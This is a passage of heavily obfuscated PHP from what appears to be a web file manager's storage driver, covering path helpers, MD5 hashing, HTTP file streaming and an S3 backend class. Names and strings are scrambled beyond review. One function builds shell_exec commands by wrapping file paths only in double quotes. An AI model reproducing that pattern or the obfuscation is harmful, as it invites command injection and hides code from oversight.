strtolower($åò¯¼„Òà’š); } if (strlen($åò¯¼„Òà’š) > 3 && preg_match($µÎ—ı¨‚Ø‘£[96], $åò¯¼„Òà’š, $øâİË¿¢)) { $åò¯¼„Òà’š = $µÎ—ı¨‚Ø‘£[33]; } return $åò¯¼„Òà’š; } public function pathThis($ÄÂáË) { $Í»íÛøĞôŠ =& $_SERVER[èÍ×öˆøÉ]; $ÄÂáË = str_replace($Í»íÛøĞôŠ[97], $Í»íÛøĞôŠ[8], rtrim($ÄÂáË, $Í»íÛøĞôŠ[8])); $‹¦ = strrpos($ÄÂáË, $Í»íÛøĞôŠ[8]); if ($‹¦ === !1) { return $ÄÂáË; } return substr($ÄÂáË, $‹¦ + 1); } public function pathFather($‘Âñ£¯Ã) { $ÊìÈ =& $_SERVER[èÍ×öˆøÉ]; $‘Âñ£¯Ã = str_replace($ÊìÈ[97], $ÊìÈ[8], rtrim($‘Âñ£¯Ã, $ÊìÈ[8])); $ÇÕ«Ä = strrpos($‘Âñ£¯Ã, $ÊìÈ[8]); if ($ÇÕ«Ä === !1) { return $ÊìÈ[33]; } return substr($‘Âñ£¯Ã, 0, $ÇÕ«Ä + 1); } public function hashSimple($÷´²½„‰§Í¾) { $˜ñ‡³¢‡”å =& $_SERVER[èÍ×öˆøÉ]; if (!$÷´²½„‰§Í¾) { return md5($˜ñ‡³¢‡”å[33]); } $¹„Õ¬ñ = $this->size($÷´²½„‰§Í¾); $Ú˜· = 200; $Áâ¦µ = 50; if ($¹„Õ¬ñ <= $Ú˜· * $Áâ¦µ) { return $this->hashMd5($÷´²½„‰§Í¾) . $¹„Õ¬ñ; } $Š×Şîóæ¯ñÓù = intval($¹„Õ¬ñ / $Áâ¦µ); $íèÜ§¹Óš = $˜ñ‡³¢‡”å[33]; for ($æóò¡†ØÒÓ = 0; $æóò¡†ØÒÓ < $Áâ¦µ; $æóò¡†ØÒÓ++) { $íèÜ§¹Óš .= $this->fileSubstr($÷´²½„‰§Í¾, $Š×Şîóæ¯ñÓù * $æóò¡†ØÒÓ, $Ú˜·); } $íèÜ§¹Óš .= $this->fileSubstr($÷´²½„‰§Í¾, $¹„Õ¬ñ - $Ú˜·, $Ú˜·); return md5($íèÜ§¹Óš) . $¹„Õ¬ñ; } public static $md5Cache = array(); public function hashMd5($á©·©‰) { if (!$á©·©‰) { return md5($_SERVER[èÍ×öˆøÉ][33]); } $á©·©‰ = $this->iconvSystem($á©·©‰); if (isset(self::$md5Cache[$á©·©‰])) { return self::$md5Cache[$á©·©‰]; } self::$md5Cache[$á©·©‰] = $this->hashMd5Shell($á©·©‰); if (!self::$md5Cache[$á©·©‰]) { self::$md5Cache[$á©·©‰] = @md5_file($á©·©‰); } return self::$md5Cache[$á©·©‰]; } private function hashMd5Shell($Ëâ‚ÖØ°°¢) { $±ø¦Ääîˆİª² =& $_SERVER[èÍ×öˆøÉ]; if (!$Ëâ‚ÖØ°°¢) { return md5($±ø¦Ääîˆİª²[33]); } if (!function_exists($±ø¦Ääîˆİª²[98])) { return !1; } $£¾ëëŸ = array($±ø¦Ääîˆİª²[99], $±ø¦Ääîˆİª²[100]); $È†Ğòï¯ˆ = Cache::get($±ø¦Ääîˆİª²[101]); if (!$È†Ğòï¯ˆ) { $Ëı Âò¡„¹ = BASIC_PATH . $±ø¦Ääîˆİª²[102]; $Ê» = md5_file($Ëı Âò¡„¹); $È†Ğòï¯ˆ = $±ø¦Ääîˆİª²[103]; foreach ($£¾ëëŸ as $Ö‡Î¤ı´ˆ) { $Ü­÷ø = shell_exec($Ö‡Î¤ı´ˆ . "\40\x22{$Ëı Âò¡„¹}\x22"); if ($Ü­÷ø && substr(trim($Ü­÷ø), 0, 32) == $Ê») { $È†Ğòï¯ˆ = $Ö‡Î¤ı´ˆ; break; } } Cache::set($±ø¦Ääîˆİª²[101], $È†Ğòï¯ˆ, 3600); } if ($È†Ğòï¯ˆ == $±ø¦Ääîˆİª²[103]) { return !1; } $Ü­÷ø = shell_exec($È†Ğòï¯ˆ . "\40\42{$Ëâ‚ÖØ°°¢}\42"); $Ü­÷ø = str_replace($±ø¦Ääîˆİª²[104], $±ø¦Ääîˆİª²[33], $Ü­÷ø); return substr($Ü­÷ø, 0, 32); } public function link($éÕ‡¾¸™ë¬€Â) { return $éÕ‡¾¸™ë¬€Â; } public function fileOut($ÎŠ½¿„ùâçğ, $ƒ = false, $îÒö™ËÂ…Ë = false, $©ÂÃÍ»Õ‹ = '') { $¸Êì³˜ =& $_SERVER[èÍ×öˆøÉ]; $this->cacheMethod(null, null); if (!$ÎŠ½¿„ùâçğ || !$this->exist($ÎŠ½¿„ùâçğ)) { show_json(LNG($¸Êì³˜[105]), !1, $îÒö™ËÂ…Ë); } $ìÄŒ = $this->getType() == $¸Êì³˜[106]; $Æª©Ğ‡“¨  = $GLOBALS[$¸Êì³˜[6]][$¸Êì³˜[88]][$¸Êì³˜[107]][$¸Êì³˜[108]]; $¢‰èù—èÊ = (double) $GLOBALS[$¸Êì³˜[6]][$¸Êì³˜[88]][$¸Êì³˜[107]][$¸Êì³˜[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Î† = $this->infoFull($ÎŠ½¿„ùâçğ); $Ú¥½Ô ø† = $Î†[$¸Êì³˜[78]]; $…Ûªå´®ù¹Ïï = gmdate($¸Êì³˜[110], $Î†[$¸Êì³˜[84]]); $÷¥« = $îÒö™ËÂ…Ë ? $îÒö™ËÂ…Ë : $this->iconvApp($Î†[$¸Êì³˜[28]]); $öå‰ÌË = 0; $ã = $Ú¥½Ô ø† - 1; $†òìÅÅä³¤ = $this->ext($÷¥«); if (in_array($†òìÅÅä³¤, array($¸Êì³˜[111], $¸Êì³˜[112], $¸Êì³˜[113], $¸Êì³˜[114]))) { $†òìÅÅä³¤ = $¸Êì³˜[115]; } if (!$©ÂÃÍ»Õ‹) { $©ÂÃÍ»Õ‹ = md5($…Ûªå´®ù¹Ïï . $this->hashSimple($ÎŠ½¿„ùâçğ)); } $©ÂÃÍ»Õ‹ = $¸Êì³˜[116] . $©ÂÃÍ»Õ‹ . $¸Êì³˜[116]; $©×Ÿê®¸©³ = get_file_mime($†òìÅÅä³¤); if (strstr($©×Ÿê®¸©³, $¸Êì³˜[117])) { $©×Ÿê®¸©³ = $©×Ÿê®¸©³ . $¸Êì³˜[118]; } if ($ƒ === !1 && !mime_support($©×Ÿê®¸©³)) { $ƒ = !0; $©×Ÿê®¸©³ = $¸Êì³˜[119]; } header($¸Êì³˜[120]); header($¸Êì³˜[121] . $©×Ÿê®¸©³); $œÇ¥óÎ©½ = rawurlencode($÷¥«); $œÇ¥óÎ©½ = $¸Êì³˜[116] . $œÇ¥óÎ©½ . $¸Êì³˜[122] . $œÇ¥óÎ©½; if ($ƒ) { header($¸Êì³˜[123]); header($¸Êì³˜[124] . $œÇ¥óÎ©½); } else { header($¸Êì³˜[125] . $œÇ¥óÎ©½); } header($¸Êì³˜[126] . gmdate($¸Êì³˜[110], time() + 3600 * 24 * 30) . $¸Êì³˜[127]); header($¸Êì³˜[128]); header($¸Êì³˜[129]); header($¸Êì³˜[130]); if (isset($_SERVER[$¸Êì³˜[131]]) && strtotime($_SERVER[$¸Êì³˜[131]]) == $Î†[$¸Êì³˜[84]]) { header($¸Êì³˜[132], !0, 304); die; } if (isset($_SERVER[$¸Êì³˜[133]]) && $_SERVER[$¸Êì³˜[133]] == $©ÂÃÍ»Õ‹) { header($¸Êì³˜[134] . $©ÂÃÍ»Õ‹, !0, 304); die; } header($¸Êì³˜[134] . $©ÂÃÍ»Õ‹); header($¸Êì³˜[135] . $…Ûªå´®ù¹Ïï . $¸Êì³˜[127]); header($¸Êì³˜[136] . $÷¥«); header($¸Êì³˜[137]); header($¸Êì³˜[138] . $Ú¥½Ô ø†); header($¸Êì³˜[139]); if (!$ƒ && $†òìÅÅä³¤ == $¸Êì³˜[140]) { if ($Ú¥½Ô ø† > 1024 * 1024 * 5) { die; } $…´ = $this->getContent($ÎŠ½¿„ùâçğ); $…´ = Html::clearSVG($…´); header($¸Êì³˜[141] . strlen($…´)); echo $…´; die; } $ƒó = strtolower($_SERVER[$¸Êì³˜[142]]); if ($ìÄŒ && $ƒó && $Æª©Ğ‡“¨ ) { if (strstr($ƒó, $¸Êì³˜[143])) { header($¸Êì³˜[144] . $ÎŠ½¿„ùâçğ); } else { if (strstr($ƒó, $¸Êì³˜[145])) { header($¸Êì³˜[146] . $ÎŠ½¿„ùâçğ); } else { if (strstr($ƒó, $¸Êì³˜[147])) { header($¸Êì³˜[148] . $ÎŠ½¿„ùâçğ); } } } if ($¢‰èù—èÊ) { header($¸Êì³˜[149] . $¢‰èù—èÊ); } return; } if (isset($_SERVER[$¸Êì³˜[150]])) { if (preg_match($¸Êì³˜[151], $_SERVER[$¸Êì³˜[150]], $îøÃ¦ÆÜ)) { $öå‰ÌË = intval($îøÃ¦ÆÜ[1]); if (!empty($îøÃ¦ÆÜ[2])) { $ã = intval($îøÃ¦ÆÜ[2]); } } header($¸Êì³˜[152]); header("\103\x6f\156\x74\145\x6e\x74\x2d\122\x61\x6e\147\x65\72\40\142\171\164\x65\x73\40{$öå‰ÌË}\x2d{$ã}\57" . $Ú¥½Ô ø†); } else { header($¸Êì³˜[153]); } $Ÿ³ƒû‹ = !0; if ($_SERVER[$¸Êì³˜[154]] == $¸Êì³˜[155] && $Ú¥½Ô ø† > 1204 * 1024 * 1024 * 2) { $Ÿ³ƒû‹ = !1; } if ($Ÿ³ƒû‹) { header($¸Êì³˜[156] . ($ã - $öå‰ÌË + 1)); } if ($_SERVER[$¸Êì³˜[157]] == $¸Êì³˜[158]) { return; } $ºË­ = 1024 * 100; $¿‚˜Ô½ñ€À = 0; if ($¢‰èù—èÊ) { $¿‚˜Ô½ñ€À = intval(1000 * 1000 * ($ºË­ / $¢‰èù—èÊ)); } while ($öå‰ÌË <= $ã) { $¨–Ú§ƒƒòÍí = timeFloat(); check_abort(); $£ÆÕªÆó = $ã - $öå‰ÌË + 1; if ($£ÆÕªÆó <= $ºË­) { $ºË­ = $£ÆÕªÆó; } echo $this->fileSubstr($ÎŠ½¿„ùâçğ, $öå‰ÌË, $ºË­); $öå‰ÌË += $ºË­; if ($ºË­ == $£ÆÕªÆó) { $öå‰ÌË = $ã + 1; } if ($¿‚˜Ô½ñ€À) { $¥Ï¯£–Ä  = intval(1000 * 1000 * (timeFloat() - $¨–Ú§ƒƒòÍí)); $£‡ü¨àåàÁæÚ = $¿‚˜Ô½ñ€À - $¥Ï¯£–Ä ; if ($£‡ü¨àåàÁæÚ > 5) { usleep($£‡ü¨àåàÁæÚ); } } } } public function fileOutServer($”¼æƒ, $›³Ì—Ş¾ı´… = false, $Û = false, $¾İÔ‘ã§ = '') { $this->fileOut($”¼æƒ, $›³Ì—Ş¾ı´…, $Û, $¾İÔ‘ã§); } public function fileOutLink($ìâúï…ğ) { header($_SERVER[èÍ×öˆøÉ][159] . $ìâúï…ğ); die; } public function cacheMethod($¸£åÃğòÀ, $éæ‰—²Ó, $è ­üó€ˆ»ñ² = null) { $§éœ =& $_SERVER[èÍ×öˆøÉ]; static $‚¥Ù°Ÿ§ = array(); $è÷ = $éæ‰—²Ó ? ltrim($this->getPathOuter($éæ‰—²Ó), $§éœ[8]) : $éæ‰—²Ó; $›ÍªµÜ = $§éœ[160] . $¸£åÃğòÀ . $§éœ[161] . rtrim($è÷, $§éœ[8]); if (is_null($¸£åÃğòÀ)) { $‚¥Ù°Ÿ§ = array(); return; } if (is_null($éæ‰—²Ó)) { unset($‚¥Ù°Ÿ§[$›ÍªµÜ]); return; } if (!is_null($è ­üó€ˆ»ñ²)) { $‚¥Ù°Ÿ§[$›ÍªµÜ] = $è ­üó€ˆ»ñ²; return; } $ôïÉğ× = isset($‚¥Ù°Ÿ§[$›ÍªµÜ]) ? $‚¥Ù°Ÿ§[$›ÍªµÜ] : null; if (!is_null($ôïÉğ×)) { return $ôïÉğ×; } $ôïÉğ× = $this->{$¸£åÃğòÀ}($éæ‰—²Ó); $‚¥Ù°Ÿ§[$›ÍªµÜ] = $ôïÉğ×; return $ôïÉğ×; } public function fileOutImage($óöæÁÜÈ¦àóÉ, $„¥÷·äÜ = 250) { $÷à” =& $_SERVER[èÍ×öˆøÉ]; set_timeout(); if (substr($óöæÁÜÈ¦àóÉ, 0, 4) == $÷à”[147]) { $this->fileOutLink($óöæÁÜÈ¦àóÉ); } $¼øŠ¡Ù = $this->info($óöæÁÜÈ¦àóÉ); $Ì‹‚² = $¼øŠ¡Ù[$÷à”[28]]; $Ô = !1; if (isset($GLOBALS[$÷à”[162]]) && $GLOBALS[$÷à”[162]][$÷à”[76]] == $¼øŠ¡Ù[$÷à”[76]]) { $Ã‰øÆ÷… = $GLOBALS[$÷à”[162]][$÷à”[163]]; if (!$¼øŠ¡Ù[$÷à”[164]]) { $¼øŠ¡Ù[$÷à”[164]] = $GLOBALS[$÷à”[162]]; } if (isset($Ã‰øÆ÷…[$÷à”[165]])) { if ($Ã‰øÆ÷…[$÷à”[165]] <= $„¥÷·äÜ && $Ã‰øÆ÷…[$÷à”[166]] <= $„¥÷·äÜ) { $Ô = !0; } } $Ì‹‚² = $¼øŠ¡Ù[$÷à”[164]][$÷à”[28]]; } if ($¼øŠ¡Ù[$÷à”[78]] <= 1024 * 50 || $Ô || !function_exists($÷à”[167]) || $¼øŠ¡Ù[$÷à”[168]] == $÷à”[169]) { return $this->fileOut($óöæÁÜÈ¦àóÉ, !1, $Ì‹‚²); } if (isset($¼øŠ¡Ù[$÷à”[164]][$÷à”[170]])) { $œ = $¼øŠ¡Ù[$÷à”[164]][$÷à”[170]]; } else { if (isset($¼øŠ¡Ù[$÷à”[164]][$÷à”[171]])) { $œ = $¼øŠ¡Ù[$÷à”[164]][$÷à”[171]]; } else { $œ = md5("{$¼øŠ¡Ù[$÷à”[28]]}\x5f{$¼øŠ¡Ù[$÷à”[76]]}\137{$¼øŠ¡Ù[$÷à”[78]]}"); } } $…øĞïÀ¹Ôš = "{$œ}\x5f{$„¥÷·äÜ}\x2e\160\156\x67"; if (!($Ö¹š = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $÷à”[172]))) { $€Õß°™ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $÷à”[173]); } else { $€Õß°™ = KodIO::make($Ö¹š); } if ($Ö¹š = IO::fileNameExist($€Õß°™, $…øĞïÀ¹Ôš)) { $ãÖäÉ±Ü = KodIO::make($Ö¹š); return IO::fileOut($ãÖäÉ±Ü, !1, $Ì‹‚²); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ãÖäÉ±Ü = DATA_THUMB . $…øĞïÀ¹Ôš; del_file($ãÖäÉ±Ü); if (!@file_exists($ãÖäÉ±Ü)) { $ëÂóÃÊÓÈ = TEMP_FILES; if (!is_dir($ëÂóÃÊÓÈ)) { mk_dir($ëÂóÃÊÓÈ); } $Åíš„â = $ëÂóÃÊÓÈ . $œ . $÷à”[95] . $¼øŠ¡Ù[$÷à”[168]]; if (!@file_exists($Åíš„â)) { $Åíš„â = $this->download($óöæÁÜÈ¦àóÉ, $Åíš„â); } ImageThumb::createThumb($Åíš„â, $ãÖäÉ±Ü, $„¥÷·äÜ, $„¥÷·äÜ * 10); } if (!file_exists($ãÖäÉ±Ü) || filesize($ãÖäÉ±Ü) < 100) { return @file_exists($Åíš„â) ? IO::fileOut($Åíš„â) : $this->fileOut($óöæÁÜÈ¦àóÉ); } if (!($Ù¤§Áåíé = IO::move($ãÖäÉ±Ü, $€Õß°™))) { return IO::fileOut($ãÖäÉ±Ü); } del_file($ãÖäÉ±Ü); IO::fileOut($Ù¤§Áåíé); } public function fileOutImageServer($úß, $·ÃŒå‘Ã‡ = 250) { $this->fileOutImage($úß, $·ÃŒå‘Ã‡); } public function fileNameAuto($®ï€‰ö¯, $–…›Æú, $ÛìÖÛ©Ç½ = REPEAT_RENAME, $­Ö€áøÎ = false) { $‡ß€âŸÂ“ı©¤ =& $_SERVER[èÍ×öˆøÉ]; $½Õå²Š = $®ï€‰ö¯ === $‡ß€âŸÂ“ı©¤[33] ? $–…›Æú : rtrim($®ï€‰ö¯, $‡ß€âŸÂ“ı©¤[8]) . $‡ß€âŸÂ“ı©¤[8] . $–…›Æú; if ($ÛìÖÛ©Ç½ == REPEAT_REPLACE || !$this->exist($½Õå²Š) || $­Ö€áøÎ && $ÛìÖÛ©Ç½ != REPEAT_RENAME_FOLDER) { return $–…›Æú; } if ($ÛìÖÛ©Ç½ == REPEAT_SKIP) { return !1; } $éîì¯Ï· = $‡ß€âŸÂ“ı©¤[95] . get_path_ext($–…›Æú); $éîì¯Ï· = $éîì¯Ï· == $‡ß€âŸÂ“ı©¤[95] || $­Ö€áøÎ ? $‡ß€âŸÂ“ı©¤[33] : $éîì¯Ï·; $ÖÂÕîøŞîı = 1; $“ = substr($–…›Æú, 0, strlen($–…›Æú) - strlen($éîì¯Ï·)); $§§ßˆ•å¹½²Ö = $“ . "\x28{$ÖÂÕîøŞîı}\x29{$éîì¯Ï·}"; while ($this->exist(rtrim($®ï€‰ö¯, $‡ß€âŸÂ“ı©¤[8]) . $‡ß€âŸÂ“ı©¤[8] . $§§ßˆ•å¹½²Ö)) { $§§ßˆ•å¹½²Ö = $“ . "\x28{$ÖÂÕîøŞîı}\x29{$éîì¯Ï·}"; $ÖÂÕîøŞîı++; } return $§§ßˆ•å¹½²Ö; } private function fileNameAutoList($ö®Ñ…³úª¬î, $Ä”¼ı‹’äÕ, $Ş¡½ı = false) { $¸ÏÃ =& $_SERVER[èÍ×öˆøÉ]; $ãÈÄ¨ = $this->listPath($ö®Ñ…³úª¬î, !0); $ãÈÄ¨ = array_merge($ãÈÄ¨[$¸ÏÃ[75]], $ãÈÄ¨[$¸ÏÃ[74]]); $·áÈÇªÄ¥ÔÎĞ = array_to_keyvalue($ãÈÄ¨, $¸ÏÃ[33], $¸ÏÃ[28]); $Ó’Óœ×Ê˜‚ = $¸ÏÃ[95] . get_path_ext($Ä”¼ı‹’äÕ); $Ó’Óœ×Ê˜‚ = $Ó’Óœ×Ê˜‚ == $¸ÏÃ[95] || $Ş¡½ı ? $¸ÏÃ[33] : $Ó’Óœ×Ê˜‚; $ë¦£Æêë„ÜÚ™ = substr($Ä”¼ı‹’äÕ, 0, strlen($Ä”¼ı‹’äÕ) - strlen($Ó’Óœ×Ê˜‚)); $ÇÑ“ = $ë¦£Æêë„ÜÚ™ . "\x28\60\51{$Ó’Óœ×Ê˜‚}"; for ($ = 1; $ <= count($·áÈÇªÄ¥ÔÎĞ) + 1; $++) { $ÇÑ“ = $ë¦£Æêë„ÜÚ™ . "\x28{$}\x29{$Ó’Óœ×Ê˜‚}"; if (!in_array_not_case($ÇÑ“, $·áÈÇªÄ¥ÔÎĞ)) { return $ÇÑ“; } } return $ÇÑ“; } public function listAllFiles($™Ï«¥ÊŸî, $¿íÜãÀ, $µ¿ = array()) { $Æ =& $_SERVER[èÍ×öˆøÉ]; if (empty($¿íÜãÀ)) { return array(); } $ÖàüŸ = array(); $™Ï«¥ÊŸî = trim($™Ï«¥ÊŸî, $Æ[8]); foreach ($¿íÜãÀ as $üª) { $¯Õ = ltrim(substr(trim($üª, $Æ[8]), strlen($™Ï«¥ÊŸî)), $Æ[8]); $ÖàüŸ = array_merge($ÖàüŸ, $this->slicePath($¯Õ)); } $éÓÍĞ = array(); foreach (array_unique($ÖàüŸ) as $üª) { $µèË¤–Ê…È„ = array($Æ[76] => $this->getPathOuter($Æ[8] . $™Ï«¥ÊŸî . $Æ[8] . $üª), $Æ[77] => 1, $Æ[78] => 0); if (substr($üª, -1) != $Æ[8]) { $µèË¤–Ê…È„[$Æ[77]] = 0; $Ï¾ì¿ = $this->getPath($™Ï«¥ÊŸî . $Æ[8] . $üª); $µèË¤–Ê…È„[$Æ[78]] = isset($µ¿[$Ï¾ì¿]) ? $µ¿[$Ï¾ì¿] : $this->size($Ï¾ì¿); } $éÓÍĞ[] = $µèË¤–Ê…È„; } return $éÓÍĞ; } public function slicePath($”ÀĞ) { $…ø¶‹ğÊ =& $_SERVER[èÍ×öˆøÉ]; $ĞæËì = explode($…ø¶‹ğÊ[8], trim($”ÀĞ, $…ø¶‹ğÊ[8])); $ı³«¨ = 0; do { ++$ı³«¨; $„šôĞ’Ú[] = implode($…ø¶‹ğÊ[8], array_slice($ĞæËì, 0, $ı³«¨)) . $…ø¶‹ğÊ[8]; } while ($ı³«¨ < count($ĞæËì)); $„šôĞ’Ú[count($ĞæËì) - 1] = $”ÀĞ; return $„šôĞ’Ú; } public function getHost() { $£„ =& $_SERVER[èÍ×öˆøÉ]; $Œì³ = parse_url(trim($this->domain, $£„[8])); $—ÁÆ˜ºÅµ‰ = isset($Œì³[$£„[174]]) ? $Œì³[$£„[174]] : http_type(); $âÛŠô•’ñ = isset($Œì³[$£„[175]]) ? $Œì³[$£„[175]] : $Œì³[$£„[76]]; if (isset($Œì³[$£„[176]])) { $âÛŠô•’ñ .= $£„[4] . $Œì³[$£„[176]]; } return $—ÁÆ˜ºÅµ‰ . $£„[177] . $âÛŠô•’ñ; } public function pathEncode($ëæşŒŞÖíÛ) { $§İ =& $_SERVER[èÍ×öˆøÉ]; return str_replace($§İ[178], $§İ[8], rawurlencode($ëæşŒŞÖíÛ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ü¼Êñ¯œùæ) { set_timeout(); require_once SDK_DIR . $_SERVER[èÍ×öˆøÉ][179]; parent::__construct(); $this->_init($ü¼Êñ¯œùæ); } public function _init($‡ä) { foreach ($‡ä as $Â–·Ú’î => $ä“) { if (isset($this->{$Â–·Ú’î})) { $this->{$Â–·Ú’î} = $ä“; } } $this->endpoint = $‡ä[$_SERVER[èÍ×öˆøÉ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÄÏ = "\166\64") { $this->signVer = $ÄÏ; $this->client->setSignatureVersion($ÄÏ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÚåØÔ =& $_SERVER[èÍ×öˆøÉ]; $ãƒñê«ú¬»Ä = $this->getBucketCors(); if (!$ãƒñê«ú¬»Ä || !is_array($ãƒñê«ú¬»Ä)) { return !1; } if ($ãƒñê«ú¬»Ä[$ÚåØÔ[181]] != $ÚåØÔ[182] || $ãƒñê«ú¬»Ä[$ÚåØÔ[183]] != $ÚåØÔ[182]) { return !1; } $×›»…åå = array_map($ÚåØÔ[184], $ãƒñê«ú¬»Ä[$ÚåØÔ[185]]); if (!is_array($×›»…åå)) { $×›»…åå = array(); } $éÒÔ¯® = array($ÚåØÔ[186], $ÚåØÔ[187], $ÚåØÔ[188], $ÚåØÔ[189], $ÚåØÔ[190]); $ôÎñµ = array_diff($éÒÔ¯®, $×›»…åå); return empty($ôÎñµ); } public function mkfile($ÜÈ³ÔÙÕ, $“†ÀëÉğ„• = '', $š÷ = REPEAT_RENAME) { $÷‡ = $this->setContent($ÜÈ³ÔÙÕ, $“†ÀëÉğ„•); if ($÷‡ !== !1) { return $this->getPathOuter($ÜÈ³ÔÙÕ); } return !1; } public function mkdir($²é¬, $Ã = REPEAT_SKIP) { $Ø°£Ø× =& $_SERVER[èÍ×öˆøÉ]; if (empty($²é¬) && $²é¬ !== $Ø°£Ø×[191]) { return !1; } if ($this->_isFolder($²é¬)) { return $this->getPathOuter($²é¬); } $Ê’ = $this->setContent($²é¬, $Ø°£Ø×[33], !0); if ($Ê’ !== !1) { return $this->getPathOuter($²é¬); } return !1; } public function copyFile($Á, $ñë÷”í©Í‘á, $¡Ö = array()) { $Ë¯ü¹ş =& $_SERVER[èÍ×öˆøÉ]; $Åùó˜ = $this->objectMeta($Á); if (!$Åùó˜) { return !1; } if ($Åùó˜[$Ë¯ü¹ş[78]] <= 1024 * 1024 * 200) { $ŞëØÅ = $this->client->copyObject($this->bucket, $Á, $this->bucket, $ñë÷”í©Í‘á, $Ë¯ü¹ş[192], $¡Ö); } else { $ŞëØÅ = $this->client->multiCopyObject($this->bucket, $Á, $this->bucket, $ñë÷”í©Í‘á, $¡Ö); } $ŞëØÅ = $ŞëØÅ ? $this->getPathOuter($ñë÷”í©Í‘á) : !1; return $ŞëØÅ; } public function moveFile($É»®À„Í, $Ñ±Âé –ûò¡) { if ($this->copyFile($É»®À„Í, $Ñ±Âé –ûò¡)) { $this->delFile($É»®À„Í); return $this->getPathOuter($Ñ±Âé –ûò¡); } return !1; } public function delFile($âÔƒ¨§) { return $this->client->deleteObject($this->bucket, $âÔƒ¨§); } public function delFolder($â) { $´ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->exist($â)) { return !0; } $this->listItemCache = !1; $›ÂÓ×‡¯¨Ê¦ = $this->fileList($â); $this->listItemCache = !0; $ŸÓÆ = trim($â, $´[8]) . $´[8]; if (!empty($â) && $â !== $´[191] && !in_array($ŸÓÆ, $›ÂÓ×‡¯¨Ê¦[$´[75]])) { $›ÂÓ×‡¯¨Ê¦[$´[75]][] = $ŸÓÆ; } $“Ãå£âŠ„ = $this->delByBatch($›ÂÓ×‡¯¨Ê¦[$´[74]]); if (!$“Ãå£âŠ„) { return !1; } $“Ãå£âŠ„ = $this->delByBatch($›ÂÓ×‡¯¨Ê¦[$´[75]]); if (!$“Ãå£âŠ„) { return !1; } return $this->delFile($ŸÓÆ); } private function delByBatch($å¬ï) { foreach (array_chunk($å¬ï, 1000) as $‹±ÛƒıûÀæ¨) { $Æ¯ªí¾°®’ = $this->client->deleteObjects($this->bucket, $‹±ÛƒıûÀæ¨); if (!$Æ¯ªí¾°®’) { return !1; } } return !0; } public function rename($õÄÚ±„–», $¦°›‹) { return $this->renameObject($õÄÚ±„–», $¦°›‹); } public function listPath($¶ê‘õ×Á, $æ¦•Ÿ™æğà = false) { $ÄŒ¾Ö =& $_SERVER[èÍ×öˆøÉ]; $ˆ•Ëöö = $this->fileList($¶ê‘õ×Á, $ÄŒ¾Ö[8], !0); foreach ($ˆ•Ëöö[$ÄŒ¾Ö[75]] as $Ä‘ => $õü†’ğ„ºÊì) { $ˆ•Ëöö[$ÄŒ¾Ö[75]][$Ä‘] = $this->folderInfo($õü†’ğ„ºÊì, $æ¦•Ÿ™æğà); } foreach ($ˆ•Ëöö[$ÄŒ¾Ö[74]] as $Ä‘ => $õü†’ğ„ºÊì) { $ˆ•Ëöö[$ÄŒ¾Ö[74]][$Ä‘] = $this->fileInfo($õü†’ğ„ºÊì[$ÄŒ¾Ö[28]], $æ¦•Ÿ™æğà, $õü†’ğ„ºÊì); } return $ˆ•Ëöö; } private function fileInfo($ªÂø£çÆ, $Ë—Æ = false, $…‘Ä¼²ğõ = array()) { $¨ŞİÏùÍ¹ =& $_SERVER[èÍ×öˆøÉ]; $ºğ‘ôÇø˜ÄŒ = array($¨ŞİÏùÍ¹[28] => $this->pathThis($ªÂø£çÆ), $¨ŞİÏùÍ¹[76] => $this->getPathOuter($ªÂø£çÆ), $¨ŞİÏùÍ¹[29] => $¨ŞİÏùÍ¹[193], $¨ŞİÏùÍ¹[168] => $this->ext($ªÂø£çÆ), $¨ŞİÏùÍ¹[78] => isset($…‘Ä¼²ğõ[$¨ŞİÏùÍ¹[78]]) ? $…‘Ä¼²ğõ[$¨ŞİÏùÍ¹[78]] : 0); if ($Ë—Æ) { return $ºğ‘ôÇø˜ÄŒ; } $ºğ‘ôÇø˜ÄŒ[$¨ŞİÏùÍ¹[194]] = $ºğ‘ôÇø˜ÄŒ[$¨ŞİÏùÍ¹[84]] = 0; $ºğ‘ôÇø˜ÄŒ[$¨ŞİÏùÍ¹[195]] = $ºğ‘ôÇø˜ÄŒ[$¨ŞİÏùÍ¹[196]] = !0; if (empty($…‘Ä¼²ğõ)) { $…‘Ä¼²ğõ = $this->objectMeta($ªÂø£çÆ); if (!$…‘Ä¼²ğõ) { return $ºğ‘ôÇø˜ÄŒ; } } if (isset($…‘Ä¼²ğõ[$¨ŞİÏùÍ¹[197]])) { $ºğ‘ôÇø˜ÄŒ[$¨ŞİÏùÍ¹[84]] = $…‘Ä¼²ğõ[$¨ŞİÏùÍ¹[197]]; } if (isset($…‘Ä¼²ğõ[$¨ŞİÏùÍ¹[78]])) { $ºğ‘ôÇø˜ÄŒ[$¨ŞİÏùÍ¹[78]] = $…‘Ä¼²ğõ[$¨ŞİÏùÍ¹[78]]; } return $ºğ‘ôÇø˜ÄŒ; } private function folderInfo($Ò¬¥ –£, $×ƒÕèÜâığ¢û = false) { $è·¢ =& $_SERVER[èÍ×öˆøÉ]; $ƒ´øïì… = array($è·¢[28] => $this->pathThis($Ò¬¥ –£), $è·¢[76] => $this->getPathOuter($è·¢[8] . $Ò¬¥ –£), $è·¢[29] => $è·¢[77]); if ($×ƒÕèÜâığ¢û) { return $ƒ´øïì…; } $ƒ´øïì…[$è·¢[194]] = $ƒ´øïì…[$è·¢[84]] = 0; $ƒ´øïì…[$è·¢[195]] = $ƒ´øïì…[$è·¢[196]] = !0; if ($Ò¬¥ –£ == $è·¢[33]) { return $ƒ´øïì…; } $Ò¬¥ –£ = trim($Ò¬¥ –£, $è·¢[8]) . $è·¢[8]; $Ê´ŒØÅˆÚ×« = $this->objectMeta($Ò¬¥ –£); if (isset($Ê´ŒØÅˆÚ×«[$è·¢[197]])) { $ƒ´øïì…[$è·¢[194]] = 